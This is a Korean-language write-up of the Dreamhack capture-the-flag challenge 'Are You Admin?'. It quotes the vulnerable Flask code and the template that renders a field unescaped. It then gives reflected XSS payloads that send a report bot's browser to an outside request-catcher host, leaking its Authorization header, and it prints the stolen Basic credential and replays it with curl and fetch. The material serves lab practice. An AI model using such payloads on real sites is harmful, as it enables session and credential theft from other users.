# Challenge: dreamhack - Are You Admin?

## 문제 설명 & 접근
https://dreamhack.io/wargame/challenges/1922


## 문제 풀이
Step 1
* app.py부터 보자. 플래그를 얻으려면 /whoami로 Authorization 헤더를 가지고 접근해야 한다. 그 헤더는 "Basic 인코딩된부분"으로 설정되어 있고 인코딩된 부분은 "admin:비밀번호"를 인코딩한 것으로 보인다.
    ```python
    @app.route("/whoami", methods=["GET"])
    def whoami():
        user_info = ""
        authorization = request.headers.get("Authorization")

        if authorization:
            user_info = b64decode(authorization.split("Basic ")[1].encode()).decode()
        else:
            user_info = "guest:guest"

        id = user_info.split(":")[0]
        password = user_info.split(":")[1]
        if (id == "admin") and (password == "[**REDACTED**]"):
            message = FLAG
            return render_template("whoami.html", id=id, message=message)
        else:
            message = "You are guest"
            return render_template("whoami.html", id=id, message=message)
    ```
* 그리고 Authorization 헤더에 해당 부분을 추가해 접근하는 코드는 access_page에 구현되어 있고, 이를 사용하는 방법은 /report의 폼에 path를 입력하는 것이다. path를 "/intro?name=abc&detail=abc"와 같이 입력하면 name과 detail을 추출해 access_page가 /intro에 해당 값을 넘긴다.
    ```python
    @app.route("/report", methods=["GET", "POST"])
    def report():
        if request.method == "POST":
            path = request.form.get("path")
            if not path:
                return render_template("report.html", msg="fail")

            else:
                parsed_path = urlparse(path)
                params = parse_qs(parsed_path.query)
                name = params.get("name", [None])[0]
                detail = params.get("detail", [None])[0]

                if access_page(name, detail):
                    return render_template("report.html", message="Success")
                else:
                    return render_template("report.html", message="fail")
        else:
            return render_template("report.html")
    ```
* intro.html을 보면, name에 safe 필터를 사용하므로 html 태그를 넣을 수 있다는 걸 알 수 있다. 
    ```html
    </head>
    <body>
        <div class="container">
            <h1>Introduction</h1>
            {% if name and detail %}
                <p>Hello, my name is <strong>{{ name | safe }}</strong>.</p>
                <p>{{ detail }}</p>
            {% else %}
                <p>Introduce yourself!</p>
            {% endif %}
        </div>
    </body>
    </html>
    ```

step 2
* 직접적으로 주소창에 다음을 입력하자. "/intro?name=<script>fetch('https://diucknp.request.dreamhack.games')</script>&detail=1"을 입력하자. get 요청이 오는 것을 알 수 있다. 이제 이를 /report에 입력해보자. ..? GET 요청이 아니라 OPTIONS 요청이 온다. Authorization이 공란으로 표시되는 것을 알 수 있다. fetch는 JS 내부에서 비동기 network를 요청하므로 CORS 정책에 따라 OPTIONS와 같은 특수 상황이 발생할 수 있다. 따라서 페이로드를 브라우저가 페이지 리다이렉션하는 GET 요청을 보내는 방식으로 수정했다. /intro?name=<img src=x onerror="location.href='https://tcvjgje.request.dreamhack.games/'">&detail=444
* 이와 같이 입력하면 Authorization 헤더에 "Basic YWRt~~"가 담겨있다.

Basic YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY
step 3
* Authorization 헤더를 얻었으니 burp suite를 이용해 해당 헤더를 추가해 /whoami에 get 요청을 보내보자. 또는 터미널에 curl로 요청을 보내도 된다.
    ```
    curl -H "Authorization: Basic YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY=" http://localhost:8000/whoami

    ```
    fetch도 당연히 가능하다.
    ```javascript
    fetch("http://host3.dreamhack.games:19551/whoami", {
        method: "GET",
        headers: {
        "Authorization": "Basic YWRtaW46MWRlOThlMTM3MDhjMWYxZjYwMjNlMTMxYTdiZDg2NzY="
        }
    })
    .then(r => r.text())
    .then(t => {
        console.log(t);
    })
    ```

## 결과
Authorization 헤더를 얻어 /whoami로 요청을 보내면 플래그를 얻을 수 있다.